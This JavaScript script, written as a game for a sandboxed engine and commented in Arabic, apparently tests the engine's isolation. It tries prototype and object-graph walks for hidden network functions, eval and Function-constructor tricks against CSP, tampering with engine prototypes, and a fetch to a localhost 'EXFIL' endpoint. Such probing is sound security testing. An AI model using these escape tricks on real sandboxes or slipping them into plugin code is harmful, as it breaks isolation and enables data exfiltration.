// @title m21 recovery tricks (regain fetch/XHR/WS/importScripts/Worker/postMessage)
// @engine 0.2
// @capabilities hud
const R = {}, V = []; try { addEventListener("securitypolicyviolation", e => V.push(e.violatedDirective.split("-")[0])); } catch (e) {}
const T = (k, f) => { try { const r = f(); R[k] = (r && r.then) ? "async" : "OPEN:" + String(r).slice(0, 20); if (r && r.then) r.then(v => R[k] = "OPEN(async):" + JSON.stringify(v).slice(0, 40), e => R[k] = "blocked:" + (e && e.name || e)); } catch (e) { R[k] = "blocked:" + (e && e.name) + (e && e.name === "Error" ? ":" + String(e.message).slice(0, 80) : ""); } };
const done = (api, ms) => setTimeout(() => { R.csp = V.length; api.end({ score: 0, text: JSON.stringify(R) }); }, ms || 1200);
const X = "http://localhost:8453/EXFIL/", S = "http://127.0.0.1:8453/EXFIL/"; // X = أصل مختلف، S = أصل المضيف نفسه
const NAMES = /^(fetch|XMLHttpRequest|WebSocket|EventSource|importScripts|Worker|SharedWorker|WebTransport|BroadcastChannel|indexedDB|caches|RTCPeerConnection|sendBeacon|openDatabase)$/;
const isNative = f => { try { return typeof f === "function" && /\[native code\]/.test(Function.prototype.toString.call(f)); } catch (e) { return false; } };
// 1) المشي على سلسلة النماذج الأولية
T("chain", () => { const found = []; for (let o = self; o; o = Object.getPrototypeOf(o)) for (const k of Reflect.ownKeys(o)) if (typeof k === "string" && NAMES.test(k)) { let v; try { v = o[k]; } catch (e) {} if (v !== undefined) found.push(k); } if (found.length) throw new Error("FOUND:" + found.join(",")); return "none"; });
T("globalThis_this", () => { const g = (function () { return this; })() || globalThis; return typeof g.fetch === "function" ? "FOUND fetch" : "none"; });
T("typeof_names", () => { const f = []; for (const k of ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "importScripts", "Worker", "SharedWorker", "WebTransport", "BroadcastChannel", "indexedDB", "caches", "RTCPeerConnection"]) if (typeof self[k] !== "undefined") f.push(k); if (f.length) throw new Error("FOUND:" + f); return "none"; });
// 2) eval/Function (تمنعهما CSP بلا unsafe-eval)
T("eval", () => eval("1+1")); T("indirect_eval", () => (0, eval)("1+1")); T("Function", () => new Function("return this")()); T("ctor_chain", () => [].constructor.constructor("return 1")());
T("setTimeout_string", () => { setTimeout("R.ts=1", 0); return "set"; }); T("async_ctor", () => (async function () {}).constructor("return 1")()); T("gen_ctor", () => (function* () {}).constructor("return 1"));
// 3) الاستيراد الديناميكي: نُقل إلى m22 (المحرك يرفض الكلمة نفسها منذ 0.2.1)
// 4) حقن/استبدال مكوّنات المحرك
T("freeze_MessagePort", () => { MessagePort.prototype.postMessage = function () {}; return Object.isFrozen(MessagePort.prototype) ? "assigned-but-frozen" : "REPLACED"; });
T("defineProperty_MP", () => { Object.defineProperty(MessagePort.prototype, "postMessage", { value: () => {} }); return "REDEFINED"; });
T("Reflect.apply", () => { Reflect.apply = () => 1; return Reflect.apply === Reflect.apply && Object.isFrozen(Reflect) ? "frozen" : "REPLACED"; });
T("Function.prototype.call", () => { Function.prototype.call = () => 1; return Object.isFrozen(Function.prototype) ? "frozen" : "REPLACED"; });
T("EventTarget_add", () => { EventTarget.prototype.addEventListener = () => 1; return Object.isFrozen(EventTarget.prototype) ? "frozen" : "REPLACED"; });
// 5) مشي الرسم البياني للكائنات بحثًا عن دوال أصلية بأسماء الشبكة
T("graph_walk", () => { const seen = new Set(), q = [self, Object.getPrototypeOf(self), performance, navigator, location, MessageChannel, Blob, Promise, Array, Object, Function, Reflect, JSON, Math, Error, URL, Event, EventTarget, MessagePort, ArrayBuffer, Uint8Array, DataView, WebAssembly, Atomics, Intl, Symbol, Map, Set, WeakMap, Proxy, Date, RegExp, String, Number, Boolean, BigInt, TextEncoder, TextDecoder, crypto, Headers, Request, Response, FormData, URLSearchParams, AbortController, FileReader, ReadableStream, WritableStream, TransformStream, CompressionStream, OffscreenCanvas, ImageData, createImageBitmap, structuredClone, setTimeout, queueMicrotask], found = []; let steps = 0;
  while (q.length && steps++ < 40000) { const o = q.shift(); if (o === null || (typeof o !== "object" && typeof o !== "function") || seen.has(o)) continue; seen.add(o); let keys; try { keys = Reflect.ownKeys(o); } catch (e) { continue; }
    for (const k of keys) { let d; try { d = Object.getOwnPropertyDescriptor(o, k); } catch (e) { continue; } if (!d) continue; const vals = [d.value, d.get, d.set]; for (const v of vals) if (v && (typeof v === "object" || typeof v === "function")) { if (typeof k === "string" && NAMES.test(k) && isNative(v)) found.push(String(k)); q.push(v); } } try { q.push(Object.getPrototypeOf(o)); } catch (e) {} }
  R.walked = seen.size; if (found.length) throw new Error("FOUND:" + [...new Set(found)].join(",")); return "none:" + seen.size; });
T("errors", () => { try { null.x; } catch (e) { return typeof e.constructor.constructor === "function" ? "ctor-only" : "none"; } });
// 6) قناة المحرك: هل تُرى المنافذ أو رسالة hello؟
T("listen_message", () => { let got = 0; self.addEventListener("message", () => got++); return "listening"; });
T("worker_in_worker_via_blob", () => new Worker(URL.createObjectURL(new Blob(["postMessage(1)"])))); T("SharedArrayBuffer", () => typeof SharedArrayBuffer);
// 7) نتيجة الـfetch الأصلي لو ظهر بأي سبيل: إن وُجد fetch حاول تسريبًا مباشرًا
T("fetch_exfil", () => (self.fetch || (() => { throw { name: "absent" }; }))(X + "recovery-fetch"));
defineGame({ init(api) { setTimeout(() => { R.ts_ran = R.ts ? "RAN" : "no"; }, 900); done(api, 1200); }, update() {}, render() {} });
